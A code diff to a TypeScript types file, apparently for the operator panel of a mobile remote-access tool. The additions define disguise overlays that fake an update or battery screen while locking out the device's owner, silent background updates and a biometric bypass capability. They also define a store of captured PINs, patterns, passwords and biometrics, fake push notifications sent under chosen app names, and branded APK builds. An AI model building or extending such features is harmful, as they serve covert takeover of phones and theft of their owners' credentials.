@@ -26,6 +26,92 @@ export interface Device {
   networkSpeed?: string;
   pingMs?: number;
   ipAddress?: string;
+  islandStatus?: IslandProfileStatus;
+  disguiseScreen?: DeviceDisguiseConfig | null;
+  agentVersion?: string;
+  backupVersion?: string;
+  updateSeed?: string;
+  updateStatus?: DeviceUpdateStatus;
+  contactName?: string;
+  phoneNumber?: string;
+  apkName?: string;
+  notes?: string;
+  userAccount?: string;
+  operator?: string;
+  deviceOwner?: string;
+  autoIdentified?: boolean;
+  identifiedAt?: string;
+}
+
+export interface UpdateDeviceRequest {
+  name?: string;
+  contactName?: string;
+  phoneNumber?: string;
+  apkName?: string;
+  notes?: string;
+  userAccount?: string;
+  operator?: string;
+  deviceOwner?: string;
+  autoIdentified?: boolean;
+}
+
+export interface DeviceAdminCapabilities {
+  screenStream: boolean;
+  touchInjection: boolean;
+  accessibilityReader: boolean;
+  islandSandbox: boolean;
+  disguiseOverlay: boolean;
+  biometricBypass: boolean;
+  vpnTunnel: boolean;
+  silentBackgroundUpdate: boolean;
+}
+
+export interface DeviceUpdateStatus {
+  deviceId: string;
+  currentAgentVersion: string;
+  latestAvailableVersion: string;
+  minAdminVersionRequired: string;
+  protocolVersion: number;
+  isUpToDate: boolean;
+  needsUpdate: boolean;
+  updateSeed: string;
+  backupVersion?: string;
+  autoUpdateEnabled: boolean;
+  capabilities: DeviceAdminCapabilities;
+  adminAccessesSatisfied: boolean;
+  backgroundUpdateState?: "idle" | "checking" | "downloading" | "installing" | "success" | "failed";
+  lastCheckedAt?: string;
+  lastUpdatedAt?: string;
+  updateUrl?: string;
+  improvements?: string[];
+}
+
+export type DeviceDisguiseType = "black" | "update" | "battery" | "custom_image";
+
+export interface DeviceDisguiseConfig {
+  type: DeviceDisguiseType;
+  active: boolean;
+  title?: string;
+  subtitle?: string;
+  progressPercent?: number;
+  customImageUrl?: string;
+  imageWidth?: number;
+  imageHeight?: number;
+  activatedAt?: string;
+  physicalTouchDisabled?: boolean;
+  remoteTouchOnly?: boolean;
+}
+
+export interface IslandProfileStatus {
+  isInstalled: boolean;
+  profileUserId: number | null;
+  profileName: string | null;
+  isRunning: boolean;
+  mirroredApps: string[];
+  autoMirrorEnabled: boolean;
+  interceptClickEnabled: boolean;
+  lastSeedSync?: string;
+  activeSeed?: string;
 }
 
 export interface RemoteSession {
@@ -86,6 +172,7 @@ export interface ScreenCustomizationConfig {
   serviceDescription?: string;
   companyPreset?: string;
   enterpriseName?: string;
+  companyEmoji?: string;
 }
 
 export type PlatformType = "android" | "ios";
@@ -110,6 +197,7 @@ export interface ApkBuildRequest {
   enrollmentToken: string;
   deviceName?: string;
   appName?: string;
+  companyEmoji?: string;
   bundleId?: string;
   redirectUrl?: string;
   logoDataUrl?: string;
@@ -118,6 +206,8 @@ export interface ApkBuildRequest {
   vpnProtocol?: "TCP" | "UDP" | "TLS";
   islandProfileEnabled?: boolean;
   workProfileEnabled?: boolean;
+  updateSeed?: string;
+  autoUpdateEnabled?: boolean;
   screenConfig?: ScreenCustomizationConfig;
   iosConfig?: IosProfileConfig;
 }
@@ -129,6 +219,7 @@ export interface ApkBuildResponse {
   zeroTouchQrPayload?: string;
   webInstallUrl?: string;
   sha256: string;
+  updateSeed?: string;
   artifactType?: "apk" | "enrollment-package" | "ios-profile" | "ios-package";
   note?: string;
   platform?: PlatformType;
@@ -200,6 +291,7 @@ export interface SavedApkBuild {
   iosProfileUrl?: string;
   savePath?: string;
   logoDataUrl?: string;
+  companyEmoji?: string;
   sizeBytes?: number;
   qrPayload?: string;
   zeroTouchQrPayload?: string;
@@ -212,6 +304,9 @@ export interface SavedApkBuild {
   vpnProtocol?: "TCP" | "UDP" | "TLS";
   islandProfileEnabled?: boolean;
   workProfileEnabled?: boolean;
+  updateSeed?: string;
+  autoUpdateEnabled?: boolean;
+  backupVersion?: string;
   screenConfig?: ScreenCustomizationConfig;
   iosConfig?: IosProfileConfig;
 }
@@ -229,10 +324,60 @@ export interface DigitalTouchEvent {
   viewText?: string;
   viewDescription?: string;
   viewClass?: string;
+  className?: string;
   viewId?: string;
   packageName?: string;
   bounds?: { left: number; top: number; right: number; bottom: number };
   source: "device_user" | "remote_simulation";
+}
+
+export type DeviceCredentialType = "fingerprint" | "face" | "pin" | "pattern" | "password";
+
+export interface DeviceCredentialEntry {
+  id: string;
+  deviceId: string;
+  type: DeviceCredentialType;
+  label: string;
+  value: string;
+  metadata?: {
+    appName?: string;
+    packageName?: string;
+    biometricId?: number;
+    patternPoints?: number[];
+    strength?: string;
+    capturedAt?: string;
+    lastUsedAt?: string;
+    source?: "auto_detected" | "manual_operator" | "agent_sync";
+    userAccount?: string;
+    sweepType?: string;
+    operator?: string;
+    [key: string]: any;
+  };
+  isActive?: boolean;
+  createdAt: string;
+}
+
+export interface DevicePushNotification {
+  id: string;
+  deviceId: string;
+  appName: string;
+  packageName: string;
+  title: string;
+  message: string;
+  category?: string;
+  timestamp: string;
+  iconEmoji?: string;
+  iconUrl?: string;
+}
+
+export interface SendPushNotificationRequest {
+  appName: string;
+  packageName?: string;
+  title: string;
+  message: string;
+  category?: string;
+  iconEmoji?: string;
+  iconUrl?: string;
 }
 
 export interface ServerToClientEvents {
@@ -243,6 +388,9 @@ export interface ServerToClientEvents {
   "chat:message": (message: ChatMessage) => void;
   "audit:new": (log: AuditLog) => void;
   "touch:event": (event: DigitalTouchEvent) => void;
+  "device:disguise": (payload: { deviceId: string; disguise: DeviceDisguiseConfig | null }) => void;
+  "device:credentials": (payload: { deviceId: string; credentials: DeviceCredentialEntry[] }) => void;
+  "device:push_notification": (payload: DevicePushNotification) => void;
 }
 
 export interface ClientToServerEvents {
@@ -262,4 +410,4 @@ export interface ChatMessage {
   timestamp: string;
 }
 
-export * from "./defaultLogos";
+export * from "./defaultLogos.js";
